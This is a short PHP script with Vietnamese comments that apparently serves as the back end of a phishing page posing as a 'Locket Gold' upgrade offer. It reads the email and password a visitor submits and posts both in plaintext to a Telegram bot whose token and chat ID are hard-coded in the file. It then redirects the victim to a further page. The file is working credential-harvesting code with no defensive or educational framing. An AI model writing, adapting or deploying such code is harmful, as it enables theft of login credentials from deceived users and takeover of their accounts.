<?php
// =============================
// CẤU HÌNH BOT TELEGRAM
// =============================
$BOT_TOKEN = "8274175937:AAEcg7M7A4iYiuc0JwbyXYbt5SP1s7_VR4g"; // 🟢 thay bằng token bot của bạn
$CHAT_ID   = "6684980246";    // 🟢 thay bằng chat ID của bạn (hoặc nhóm Telegram)

// =============================
// NHẬN DỮ LIỆU TỪ FORM
// =============================
$email    = trim($_POST['email'] ?? '');
$password = trim($_POST['password'] ?? '');

if ($email == '' || $password == '') {
    die("<script>alert('Vui lòng nhập đầy đủ Email và Mật khẩu!');history.back();</script>");
}

// =============================
// GỬI TIN NHẮN VỀ TELEGRAM
// =============================
$date = date("d/m/Y H:i:s");
$text  = "💎 *Yêu cầu nâng cấp Locket Gold mới*\n\n";
$text .= "📧 Email: *{$email}*\n";
$text .= "🔑 Mật khẩu: ||{$password}||\n";
$text .= "🕒 Thời gian: {$date}\n";
$text .= "🌐 Nguồn: Website Locket Gold";

$url = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage";
$data = [
    'chat_id' => $CHAT_ID,
    'text' => $text,
    'parse_mode' => 'Markdown'
];

$options = [
    'http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($data)
    ]
];

$context  = stream_context_create($options);
file_get_contents($url, false, $context);

// =============================
// SAU KHI GỬI → CHUYỂN SANG process.php
// =============================
header("Location: process.php?email=" . urlencode($email));
exit;
?>
